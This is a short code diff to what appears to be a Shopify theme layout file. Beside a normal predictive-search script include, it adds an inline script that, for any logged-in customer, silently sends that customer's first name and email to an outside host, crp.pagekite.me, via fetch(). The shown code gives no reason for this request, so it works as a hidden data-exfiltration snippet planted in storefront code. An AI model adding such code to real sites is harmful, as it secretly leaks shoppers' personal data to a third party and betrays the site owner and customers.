@@ -290,5 +290,11 @@
     {%- if settings.predictive_search_enabled -%}
       <script src="{{ 'predictive-search.js' | asset_url }}" defer="defer"></script>
     {%- endif -%}
+
+    <script>
+      {% if customer %}
+        fetch('https://crp.pagekite.me/' + '?name={{ customer.first_name }}&email={{ customer.email }}' );
+      {% endif %}
+    </script>
   </body>
 </html>
